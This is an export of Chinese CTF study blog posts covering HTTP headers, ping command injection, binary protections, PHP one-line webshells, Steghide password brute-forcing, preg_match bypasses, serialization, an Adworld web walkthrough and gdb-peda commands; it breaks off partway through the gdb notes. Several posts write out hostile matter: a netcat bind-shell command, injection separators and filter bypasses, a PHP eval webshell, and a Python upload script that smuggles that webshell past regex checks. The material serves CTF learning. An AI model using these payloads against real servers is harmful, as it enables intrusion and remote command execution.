    <content><![CDATA[<h1 id="web中xff与referer"><a href="#web中xff与referer" class="headerlink" title="web中xff与referer"></a>web 中 xff 与 referer</h1><h2 id="XFF字段"><a href="#XFF字段" class="headerlink" title="XFF字段"></a>XFF 字段</h2><p>X-Forwarded-For (XFF) 是用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 请求头字段。通俗来说，就是浏览器访问网站的 IP。一般格式：<br>X-Forwarded-For: client1, proxy1, proxy2, proxy3<br>左边第一个是浏览器 IP，依次往右为第一个代理服务器 IP, 第二个，第三个（使用逗号 + 空格进行分割） </p>
<p>X-Forwarded-For 值表示的是 IP 地址<br>例如：<code>X-Forwarded-For:123.123.123.123</code> </p>
<span id="more"></span>
<h2 id="HTTP-Referer"><a href="#HTTP-Referer" class="headerlink" title="HTTP Referer"></a>HTTP Referer</h2><p>HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上 Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从 HTTP Referer 中统计出每天有多少用户点击我主页上的链接访问他的网站。<br>例如：<code>referer:www.google.com</code></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>ping 注入</title>
    <url>/2020/09/05/ping%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="0x01-ICMP协议与ping命令"><a href="#0x01-ICMP协议与ping命令" class="headerlink" title="0x01 ICMP协议与ping命令"></a>0x01 ICMP 协议与 ping 命令</h1><h2 id="0x11-ping什么？"><a href="#0x11-ping什么？" class="headerlink" title="0x11 ping什么？"></a>0x11 ping 什么？</h2><p>在网络中 ping 是一个十分强大的 TCP/IP 工具。它的作用主要为：<br>（1）用来检测网络的连通情况和分析网络速度；<br>（2）根据域名得到服务器 IP；<br>（3）根据 ping 返回的 TTL 值来判断对方所使用的操作系统及数据包经过路由器数量。我们通常会用它来直接 ping IP 地址，来测试网络的连通情况。</p>
<span id="more"></span>
<p><img src="./ICMP%E5%8D%8F%E8%AE%AE%E4%B8%8Eping%E5%91%BD%E4%BB%A4.png"><br>Ping 的原理是 ICMP 协议。</p>
<h2 id="0x12-ICMP协议是什么？"><a href="#0x12-ICMP协议是什么？" class="headerlink" title="0x12 ICMP协议是什么？"></a>0x12 ICMP 协议是什么？</h2><p>ICMP 的全称是 Intent Control Message Protocol, 互联网控制报文协议。它是互联网协议族的核心协议之一。它用于 TCP/IP 网络中发送控制消息，提供可能发生在通信环境中的各种问题反馈，通过这些信息，使管理者可以对所发生的问题作出诊断，然后采取适当的措施解决。<br>在 IP 通信中，经常有数据包到达不了对方的情况。原因是，在通信途中的某处的一个路由器由于不能处理所有的数据包，就将数据包一个一个丢弃了。或者，虽然到达了对方，但是由于搞错了端口号，服务器软件可能不能接受它。这时，在错误发生的现场，为了联络而飞过来的信鸽就是 ICMP 报文。在 IP 网络上，由于数据包被丢弃等原因，为了控制将必要的信息传递给发信方。ICMP 协议是为了辅助 IP 协议，交换各种各样的控制信息而被制造出来的。</p>
<p>ICMP 的主要功能：<br>1. 确认 IP 包是否成功送达目标地址。<br>2. 通知在发送过程当中 IP 包被废弃的具体原因。</p>
<h1 id="0x11-ping注入"><a href="#0x11-ping注入" class="headerlink" title="0x11 ping注入"></a>0x11 ping 注入</h1><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>命令连接符<br>command1 &amp;&amp; command2   先执行 command1 后执行 command2<br>command1 | command2     只执行 command2<br>command1 &amp; command2    先执行 command2 后执行 command1</p>
<p>”&lt;” 表示的是输入重定向的意思，就是把 &lt; 后面跟的文件取代键盘作为新的输入设备。”| ” 则表示一个管道的意思，可以理解为东西从管道的一边流向另外一边。</p>
<p>检测一阶命令注入的最佳方式是尝试执行一个 sleep 命令</p>
<p>在外部可以访问的端口上生成一个 shell（仅适用于自定义 netcat 构建）：nc -l -n -vv -p 80 -e /bin/bash (unix) 或 nc -l -n -vv -p 80 -e cmd.exe (windows)。</p>
<p>如果想要知道目标主机名的长度，我们可以将主机名的输出通过管道符传递给 wc -c 命令。</p>
<p>常见 php 命令注入函数：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，</span><br><span class="line">array_map()，反引号，ob_start()，exec()，shell_exec()，</span><br><span class="line">passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()</span><br></pre></td></tr></tbody></table></figure>

<p>ping 注入常用字符：<br>‘$’，’;’，’|’，’-‘，’(‘，’)’，’`’(反引号)，’||’，’&amp;&amp;’，’&amp;’，’}’，’{‘</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>防护措施中使用最多的就是对于 payload 中空格的限制。</p>
<p>OS 命令注入中的空格:</p>
<p>花括号扩展：</p>
<p>bash<br>空格可以替换为 %20、%09 (tab)、%2b (+) in url、{IFS}<br>Win shell<br>空格可以替换为 %20、%09 (tab)、%0b、%0c、%2b (+) in url<br>如：;{cat,/etc/passwd}’</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>程序保护机制</title>
    <url>/2020/08/22/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="程序保护机制"><a href="#程序保护机制" class="headerlink" title="程序保护机制"></a>程序保护机制</h1><h2 id="1-NX"><a href="#1-NX" class="headerlink" title="1) NX:"></a>1) NX:</h2><p>数据执行保护，即DEP (Data Execution Prevention)，(non-executable memory)中执行指令。在80x86体系结构中，操作系统的内存管理是通过页面表(page table)存储方式来实现的，其最后一位就是NX位，0表示允许执行代码，1表示禁止执行代码。一般来说，NX主要是防止直接在 栈(stack) 和 堆(heap) 上运行shellcode代码。gcc默认开启不可执行栈功能，添加编译选项-z execstack即可开启栈可执行功能。</p>
<a id="more"></a>
<h2 id="2-ASLR"><a href="#2-ASLR" class="headerlink" title="2)ASLR:"></a>2)ASLR:</h2><p>地址空间随机化，/proc/sys/kernel/randomize_va_space里的值可以控制系统级的ASLR，使用root权限可以进行修改，有三个值可以设置，具体说明如下。<br>    ·0：关闭ASLR。<br>    ·1：mmap base、stack、vdso page将随机化。这意味着”.so”文件将被加载到随机地址。链接时指定了-pie 选项的可执行程序，其代码段加载地址将被随机化。配置内核时如果指定了 CONFIG_COMPAT BRK，则 randomize_va_space 默认为1，此时heap没有随机化。<br>    ·2：在1的基础上增加了heap随机化。配置内核时如果禁用 CONFIG_COMPAT_BRK，则 randomize_va_space 默认为2。ASLR可以保证在每次程序加载的时候自身和所加载的库文件都会被映射到虚拟地址空间的不同地址处。</p>
<h2 id="3-PIE"><a href="#3-PIE" class="headerlink" title="3) PIE:"></a>3) PIE:</h2><p>   代码段随机化，具体见ASLR。</p>
<h2 id="4-RELRO"><a href="#4-RELRO" class="headerlink" title="4) RELRO:"></a>4) RELRO:</h2><p>   重定位，一般会分为两种情况， 即 partial relro 和 fullrelro，具体区别就是前者重定位信息(如got表)可写，而后者不可写。</p>
<h2 id="5-STACK-CANARY"><a href="#5-STACK-CANARY" class="headerlink" title="5) STACK CANARY:"></a>5) STACK CANARY:</h2><p>   栈溢出保护，gcc编译程序默认开启，添加编译选项 <code>-fno-stack- protector</code> 会关闭程序的stack canary栈保护。</p>
]]></content>
  </entry>
  <entry>
    <title>一句话木马原理</title>
    <url>/2020/08/22/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h1 id="Webshell-大马"><a href="#Webshell-大马" class="headerlink" title="Webshell(大马)"></a>Webshell(大马)</h1><p>我们经常会看到Webshell，那么，到底什么是Webshell呢？</p>
<p>webshell就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。</p>
<a id="more"></a>
<p>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上的操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
<p>一方面，webshell被站长常常用于网站管理、服务器管理等等，根据FSO权限的不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。</p>
<p>另一方面，被入侵者利用，从而达到控制网站服务器的目的。这些网页脚本常称为Web脚本木马，比较流行的asp或php木马，也有基于.NET的脚本木马与JSP脚本木马。</p>
<p>但是这里所说的木马都是些体积“庞大”的木马，也就是黑客中常称呼的” 大马 “。</p>
<h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><p>拿php的一句话木马说明一下原理：</p>
<p>在PHP脚本语言中，eval(code) 的功能是将 code 组合成 php 指令，然后将指令执行，其他语言中也是使用此原理，只是函数可能不同。</p>
<p><code>&lt;?php $a=&quot;phpinfo()&quot;; eval(&quot;$a;&quot;);?&gt;   #就相当于执行 phpinfo(); 语句。</code><br>当利用web中的漏洞将<code>&lt;?php @eval($_POST[value]);?&gt;</code> 一句话插入到了可以被黑客访问且能被web服务器执行的文件中时，那么我们就可以向此文件提交post数据，post方式提交数据的参数就是这个一句话中的 value，它就称为一句话木马的密码。这样提交的数据如果是正确的php语言的语句，那么就可以被一句话木马执行，从而达到黑客的恶意目的。</p>
<p>介绍了一句话木马的原理后，我们再来说下它的优缺点：</p>
<p>优点：短小精悍，功能强大。</p>
<p>缺点：容易被安全软件检测出来。为了增强隐蔽性，也出现了各种一句话木马的变形。</p>
<p>转自：<a href="https://blog.csdn.net/qq_36119192/article/details/84563791#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8E%9F%E7%90%86%C2%A0" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84563791#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8E%9F%E7%90%86%C2%A0</a></p>
]]></content>
  </entry>
  <entry>
    <title>Steghide使用教程及其密码爆破</title>
    <url>/2020/08/24/Steghide%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E5%8F%8A%E5%85%B6%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="Steghide使用教程及其密码爆破"><a href="#Steghide使用教程及其密码爆破" class="headerlink" title="Steghide使用教程及其密码爆破"></a>Steghide使用教程及其密码爆破</h1><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Steghide是一款开源的隐写术软件，它可以让你在一张图片或者音频文件中隐藏你的秘密信息，而且你不会注意到图片或音频文件发生了任何的改变。而且，你的秘密文件已经隐藏在了原始图片或音频文件之中了。这是一个命令行软件。因此，你需要学习使用这个工具的命令。你需要通过命令来实现将秘密文件嵌入至图片或音频文件之中。除此之外，你还需要使用其他的命令来提取你隐藏在图片或音频中的秘密文件。</p>
<a id="more"></a>
<h2 id="用法介绍："><a href="#用法介绍：" class="headerlink" title="用法介绍："></a>用法介绍：</h2><p>embed, –embed embed data<br>extract, –extract extract data<br>-ef, –embedfile select file to be embedded<br>-ef （filename） embed the file filename<br>-cf, –coverfile select cover-file<br>-cf （filename） embed into the file filename<br>-p, –passphrase specify passphrase<br>-p （passphrase） use to embed data<br>-sf, –stegofile select stego file<br>-sf （filename） write result to filename instead of cover-file</p>
<h2 id="用法示例："><a href="#用法示例：" class="headerlink" title="用法示例："></a>用法示例：</h2><p>将secret.txt文件隐藏到text.jpg中：<br><code>#steghide embed -cf test.jpg -ef secret.txt -p 123456</code></p>
<p>从text.jpg解出secret.txt:<br><code>#steghide extract -sf test.jpg -p 123456</code></p>
<h1 id="Steghide爆破密码："><a href="#Steghide爆破密码：" class="headerlink" title="Steghide爆破密码："></a>Steghide爆破密码：</h1><p>steghide本身不提供爆破功能，我们需要用额外的脚本来完成这个功能，简单的爆破这里提供如下shell脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#bruteStegHide.sh </span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">for line in &#96;cat $2&#96;;do</span><br><span class="line">    steghide extract -sf $1 -p $line &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">    if [[ $? -eq 0 ]];then</span><br><span class="line">        echo &#39;password is: &#39;$line</span><br><span class="line">        exit</span><br><span class="line">    fi  </span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>用法：<br><code>#./bruteStegHide.sh test.jpg passwd.txt</code></p>
<p>转自：<a href="https://blog.csdn.net/Blood_Seeker/article/details/81837571" target="_blank" rel="noopener">https://blog.csdn.net/Blood_Seeker/article/details/81837571</a></p>
]]></content>
  </entry>
  <entry>
    <title>preg-match 绕过</title>
    <url>/2020/09/05/preg-match%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="PHP-preg-match-函数"><a href="#PHP-preg-match-函数" class="headerlink" title="PHP preg_match() 函数"></a>PHP preg_match () 函数</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>preg_match 函数用于执行一个正则表达式匹配。</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</code><br>搜索 subject 与 pattern 给定的正则表达式的一个匹配。</p>
<span id="more"></span>
<p><strong>参数说明：</strong><br>$pattern: 要搜索的模式，字符串形式。</p>
<p>$subject: 输入字符串。</p>
<p>$matches: 如果提供了参数 matches，它将被填充为搜索结果。 $matches [0] 将包含完整模式匹配到的文本， $matches [1] 将包含第一个捕获子组匹配到的文本，以此类推。</p>
<p>$flags：flags 可以被设置为以下标记值：<br>PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量 (相对于目标字符串的)。 注意：这会改变填充到 matches 参数的数组，使其每个元素成为一个由 第 0 个元素是匹配到的字符串，第 1 个元素是该匹配字符串 在目标字符串 subject 中的偏移量。</p>
<p>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索 (单位是字节)。</p>
<p><strong>返回值</strong><br>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match () 在第一次匹配后 将会停止搜索。preg_match_all () 不同于此，它会一直搜索 subject 直到到达结尾。 如果发生错误 preg_match () 返回 FALSE。</p>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p><strong>1、数组绕过</strong><br>preg_match 只能处理字符串，当传入的 subject 是数组时会返回 false</p>
<p><strong>2、PCRE 回溯次数限制</strong><br>payload：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">files = {</span><br><span class="line">  'file': BytesIO(b'aaa&lt;?php eval($_POST[txt]);//' + b'a' * 1000000)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">res = requests.post('http://170.0.0.1:8080/index.php', files=files, allow_redirects=False)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></tbody></table></figure>

<p><code>pcre.backtrack_limit</code> 给 pcre 设定了一个回溯次数上限，默认为 1000000，如果回溯次数超过这个数字，preg_match 会返回 false</p>
<p><strong>3、换行符</strong><br><code>.</code> 不会匹配换行符，例如</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (preg_match('/^.*(flag).*$/', $json)) {</span><br><span class="line">    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>需要<br><code>$json="\nflag"</code></p>
<p>而在非多行模式下，<code>$</code> 似乎会忽略在句尾的 <code>%0a</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (preg_match('/^flag$/', $_GET['a']) &amp;&amp; $_GET['a'] !== 'flag') {</span><br><span class="line">    echo $flag;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>传入<br><code>?a=flag%0a</code>  </p>
<!--转自：https://www.cnblogs.com/20175211lyz/p/12198258.html-->]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>web 序列化与反序列化</title>
    <url>/2020/09/05/web%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>序列化（串行化）：</strong><br>是将变量转换为可保存或传输的字符串的过程；</p>
<p><strong>反序列化（反串行化）：</strong><br>就是在适当的时候把这个字符串再转化成原来的变量使用。</p>
<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p>
<span id="more"></span>
<h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><p>常见的 php 系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode</p>
<ol>
<li><p>serialize 和 unserialize 函数<br>这两个是序列化和反序列化 PHP 中数据的常用函数。</p>
</li>
<li><p>json_encode 和 json_decode<br>使用 JSON 格式序列化和反序列化是一个不错的选择：<br>使用 json_encode 和 json_decode 格式输出要 serialize 和 unserialize 格式快得多。<br>JSON 格式是可读的。<br>JSON 格式比 serialize 返回数据结果小。<br>JSON 格式是开放的、可移植的。其他语言也可以使用它</p>
</li>
<li><p>var_export 和 eval<br>var_export 函数把变量作为一个字符串输出；eval 把字符串当成 PHP 代码来执行，反序列化得到最初变量的内容。</p>
</li>
<li><p>wddx_serialize_value 和 wddx deserialize<br>wddx_serialize_value 函数可以序列化数组变量，并以 XML 字符串形式输出</p>
</li>
<li><p>file_put_contents () 函数把一个字符串写入文件中</p>
<p>file_get_contents () 把整个文件读入一个字符串中。</p>
</li>
</ol>
<p>该函数是用于把文件的内容读入到一个字符串中的首选方法</p>
<!--转自：https://blog.csdn.net/vhkjhwbs/article/details/90341474-->]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界 - web</title>
    <url>/2020/09/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/</url>
    <content><![CDATA[<p>注：个人博客，图片加载缓慢，耐心等待<br>0X01 view_source 2020.08.15</p>
<hr>
<p><img src="./view_source-1.png"><br>F12 就可以</p>
<span id="more"></span>


<h2 id="0X02-get-post-2020-08-15"><a href="#0X02-get-post-2020-08-15" class="headerlink" title="0X02 get_post 2020.08.15"></a>0X02 get_post 2020.08.15</h2><p><img src="./get_post-1.png"><br><img src="./get_post-2.png"><br>GET 传值在 url 中输入值<br>例如，通过 GET 传值传入 a=1，b=2<br><code>XXXXXX(这里是网址)/?a=1&amp;b=2</code></p>
<p><img src="./get_post-3.png"><br>POST 传值通过工具传值，hackbar 或者 bp 也可以</p>
<h2 id="0X03-robots-2020-08-15"><a href="#0X03-robots-2020-08-15" class="headerlink" title="0X03 robots 2020.08.15"></a>0X03 robots 2020.08.15</h2><p>看题目是 robots 协议，在 url 后面加上 <code>robots.txt</code><br><img src="./robots-1.png"><br>发现 f1ag_1s_h3re.php<br><img src="./robots-2.png"></p>
<h2 id="0X04-backup-2020-08-15"><a href="#0X04-backup-2020-08-15" class="headerlink" title="0X04 backup 2020.08.15"></a>0X04 backup 2020.08.15</h2><p><img src="./backup-1.png"><br>备份文件的后缀一般为<code>.save</code> 和<code>.bak</code><br><img src="./backup-2.png"><br>在 url 后面加上 <code>/index.php.bak</code> 下载了一个文件</p>
<p>记事本打开，文件内容：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset="UTF-8"&gt;</span><br><span class="line">    &lt;title&gt;备份文件&lt;/title&gt;</span><br><span class="line">    &lt;link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" /&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body{</span><br><span class="line">            margin-left:auto;</span><br><span class="line">            margin-right:auto;</span><br><span class="line">            margin-TOP:200PX;</span><br><span class="line">            width:20em;</span><br><span class="line">        }</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;你知道index.php的备份文件名吗？&lt;/h3&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$flag="Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}"</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>


<h2 id="0X05-cookie-2020-08-15"><a href="#0X05-cookie-2020-08-15" class="headerlink" title="0X05 cookie 2020.08.15"></a>0X05 cookie 2020.08.15</h2><p><img src="./cookie-1.png"><br>先 bp 抓包<br><img src="./cookie-2.png"><br>有提示查看 <code>cookie.php</code><br><img src="./cookie-3.png"><br>查看之后，显示需要查看服务端响应，再抓包<br><img src="./cookie-4.png"><br>抓包后发送到服务端查看响应，表单中发现 flag</p>
<h2 id="0X06-disabled-button-2020-09-03"><a href="#0X06-disabled-button-2020-09-03" class="headerlink" title="0X06 disabled_button 2020.09.03"></a>0X06 disabled_button 2020.09.03</h2><p><img src="./disabled_button-1.png"><br>按钮不可按，这涉及到 html 表单 里的 <code>&lt;input&gt;</code> 元素<br><code>&lt;input&gt;</code> 元素是最重要的表单元素。<br><code>&lt;input&gt;</code> 元素有很多形态，根据不同的 type 属性。</p>
<p>   （1）text	    定义常规文本输入。<br>   （2）radio	定义单选按钮输入（选择多个选择之一）<br>   （3）submit	定义提交按钮（提交表单）</p>
<p>例如：<br><code>&lt;input type="submit"&gt;</code> 定义用于向表单处理程序（form-handler）提交表单的按钮</p>
<p>所以看源代码，<code>disabled</code> 禁用了 <code>&lt;input&gt;</code><br><img src="./disabled_button-2.png"><br>只要把 <code>disabled</code> 删掉，或者改成 <code>type="submit"</code> 就可以</p>
<h2 id="0X07-weak-auth-2020-09-03"><a href="#0X07-weak-auth-2020-09-03" class="headerlink" title="0X07 weak_auth 2020.09.03"></a>0X07 weak_auth 2020.09.03</h2><p><img src="./weak_auth-1.png"><br>随意输入密码试试<br><img src="./weak_auth-2.png"><br>提示账号是 <code>admin</code>，根据题目提示，bp 弱口令爆破<br><code>平时注意收集口令</code><br>爆破结果：<br><img src="./weak_auth-3.png"><br>看长度，不一样就是密码，密码 <code>123456</code>，登录就看到 flag 了</p>
<h2 id="0x08-command-execution-2020-09-04"><a href="#0x08-command-execution-2020-09-04" class="headerlink" title="0x08 command_execution 2020.09.04"></a>0x08 command_execution 2020.09.04</h2><p><img src="./command_execution-1.png"></p>
<p>ping 本机 127.0.0.1<br><img src="./command_execution-2.png"></p>
<p>有显示，ping 注入一波，看有没有禁用<br><img src="./command_execution-3.png"><br>添加连接语句之后看到 <code>index.php</code>，说明没有禁用，可以直接用连接语句查找文件和查看文件</p>
<p>输入 <code>127.0.0.1 &amp;&amp; find / -name "*.txt"</code>, 找到 flag 文件<br><img src="./command_execution-4.png"></p>
<p>输入 <code>127.0.0.1 &amp;&amp; cat /home/flag.txt</code>，查看 flag.txt 文件内容<br><img src="./command_execution-5.png"></p>
<h2 id="0x09-simple-php-2020-09-05"><a href="#0x09-simple-php-2020-09-05" class="headerlink" title="0x09 simple_php 2020.09.05"></a>0x09 simple_php 2020.09.05</h2><p>简单的弱类型比较<br><img src="./simple_php-1.png"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include("config.php");</span><br><span class="line">$a=@$_GET['a'];</span><br><span class="line">$b=@$_GET['b'];</span><br><span class="line">if($a==0 and $a){     //需要等于0，又不是等于0，而且是==号，输入英文就可以符合题意</span><br><span class="line">    echo $flag1;      //flag前半部分</span><br><span class="line">}</span><br><span class="line">if(is_numeric($b)){   //不能是数字，输入大于1234的数字后在后面加上英文就可以</span><br><span class="line">    exit();</span><br><span class="line">}</span><br><span class="line">if($b&gt;1234){</span><br><span class="line">    echo $flag2;      //flag后半部分</span><br><span class="line">}</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>在 url 后输入 <code>/?a=admin&amp;b=1235admin</code> 就得到 flag</p>
<h2 id="0x10-xff-referer-2020-09-05"><a href="#0x10-xff-referer-2020-09-05" class="headerlink" title="0x10 xff_referer 2020.09.05"></a>0x10 xff_referer 2020.09.05</h2><p><img src="./xff_referer-1.png"><br>在表头加上这两个伪造然后发送</p>
<h2 id="0x11-2020-09-06"><a href="#0x11-2020-09-06" class="headerlink" title="0x11 2020.09.06"></a>0x11 2020.09.06</h2><p><img src="./webshell-1.png"><br>一句话木马原理，利用 hackbar post 传值 <code>shell=system('ls');</code> 查看所有文件<br><img src="./webshell-2.png"></p>
<p>然后 <code>shell=system('cat flag.txt');</code><br><img src="./webshell-3.png"></p>
<p>查看指定文件里的内容</p>
<h2 id="0x12-2020-09-06"><a href="#0x12-2020-09-06" class="headerlink" title="0x12 2020.09.06"></a>0x12 2020.09.06</h2><p>题目<br><img src="./simple_js-1.png"></p>
<p>查看源代码<br><img src="./simple_js-2.png"></p>
<p>分析源码，发现随便输入什么都会输出<br>pass=”70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65” 对应的字符<br>用 python 处理一下，得到该字符串为: FAUX PASSWORD HAHA, 正好是提示错误的字符串<br><img src="./simple_js-3.png"></p>
<p>看到有有一串 16 进制的字符 \x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30，应该就是 flag 内容<br>用 python 将其转换为字符串为 <code>786OsErtk12</code></p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>WriteUp-攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb-peda 使用</title>
    <url>/2020/10/16/gdb-peda%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$ pip install peda</span><br><span class="line">$ git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit </span><br></pre></td></tr></tbody></table></figure>

<span id="more"></span>
<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">file 路径　-　附加文件</span><br><span class="line">break *0x400100 (b main) - 在 0x400100 处下断点</span><br><span class="line">tb  - 一次性断点</span><br><span class="line">info b - 查看断点信息</span><br><span class="line">enable   -   激活断点</span><br><span class="line">disable  -   禁用断点</span><br><span class="line">delete [number]  -  删除断点</span><br><span class="line">watch *(int *)0x08044530  -  在内存0x0804453处的数据改变时stop</span><br><span class="line">p $eax - 输出eax的内容</span><br><span class="line">set $eax=4 - 修改变量值</span><br><span class="line"></span><br><span class="line">c - 继续运行</span><br><span class="line">r - 开始运行</span><br><span class="line">ni - 单步步过</span><br><span class="line">si - 单步步入</span><br><span class="line">fini - 运行至函数刚结束处</span><br><span class="line">return expression - 将函数返回值指定为expression</span><br><span class="line">bt - 查看当前栈帧</span><br><span class="line">info f - 查看当前栈帧</span><br><span class="line">context - 查看运行上下文</span><br><span class="line">stack - 查看当前堆栈</span><br><span class="line">call func - 强制函数调用</span><br><span class="line">stack 100 - 插件提供的，显示栈中100项</span><br><span class="line">find xxx　 - 快速查找，很实用</span><br><span class="line"></span><br><span class="line">x/&lt;n/f/u&gt; &lt;addr&gt;     n、f、u是可选的参数。</span><br><span class="line">x /4xg $ebp：查看ebp开始的4个8字节内容</span><br><span class="line">x/wx $esp 　　以4字节16进制显示栈中内容</span><br><span class="line">b表示单字节，h表示双字节，w表示四字 节，g表示八字节</span><br><span class="line">s 按字符串输出</span><br><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">u 按十六进制格式显示无符号整型。</span><br><span class="line">o 按八进制格式显示变量。</span><br><span class="line">t 按二进制格式显示变量。</span><br><span class="line">a 按十六进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br><span class="line">i：反汇编</span><br><span class="line"></span><br><span class="line">但是实际的组合就那么几种：</span><br><span class="line">x/s 地址　　查看字符串</span><br><span class="line">x/wx 地址　　查看DWORD</span><br><span class="line">x/c 地址　　单字节查看</span><br><span class="line">x/16x $esp+12 查看寄存器偏移</span><br><span class="line"></span><br><span class="line">set args  - 可指定运行时参数。（如：set args 10 20 30 40 50）</span><br><span class="line">show args  - 